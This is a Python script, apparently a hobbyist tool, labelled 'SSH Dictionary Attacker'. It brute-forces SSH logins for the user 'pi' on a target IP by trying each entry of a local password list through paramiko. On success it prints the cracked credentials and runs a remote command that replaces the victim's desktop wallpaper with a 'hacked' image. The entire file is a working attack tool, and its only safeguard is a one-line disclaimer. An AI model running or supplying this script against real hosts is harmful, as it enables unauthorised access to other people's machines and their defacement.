import paramiko, sys, os
import time
global target, port, user, password_list
def sshConnect(password):
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        start = time.time()
        ssh.connect(target, port=int(float(port)), username=user, password=password)
    except paramiko.AuthenticationException:
        ssh.close()
        print('Unsuccessful')
    except OSError:
        f.close()
        ssh.close()
        sys.exit('\n[+] Connection to ' + target + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')
    except KeyboardInterrupt:
        sys.exit('\n[+] Exiting...\n')
    else:
        print('Bingo!')
        print('\n[!] SUCCESS! Creds: ' + user + '@' + target + ':' + str(port) + ' Password: ' + password + '\n')
        f.close()
        stdin=ssh.exec_command('DISPLAY=:0 pcmanfm --set-wallpaper "/home/pi/hacked.jpg"')
        stop = time.time()
        print ("Total time for execution was:",stop - start)
        sys.exit(0)
print('\n[+] SSH Dictionary Attacker')
print('[!] No permission is given for the unlawful use of this script\n')
try:
    target=input('Enter Targeted IP address:')
    port=22
    user='pi'
    password_list='/home/pi/password_list.txt'
    if target == '' or user == '' or password_list == '':
        sys.exit('\n[!] One or more required inputs ommited\n[+] Exiting...\n')
    elif os.path.exists(password_list) == False:
        sys.exit('\n[!] File ' + password_list + ' does not exist\n[+] Exiting...\n')
    elif port == '':
        port = 22
except KeyboardInterrupt:
    sys.exit('\n[+] Exiting...\n')
try:
    f = open(password_list, 'r')
except OSError:
    sys.exit('\n[!] ' + password_list + ' is not an acceptable file path\n[+] Exiting...\n')
count = 0 
for line in f.readlines():
    password = line.strip('\n')
    count += 1
    print('[-] Attempt ' + str(count) + ': ' + password + ' ...')
    sshConnect(password)
f.close()
print('\n[+] Unsuccessful, Password list exhausted\n[!] Check username and/or use a larger password list\n')
sys.exit('[+] Exiting...\n')
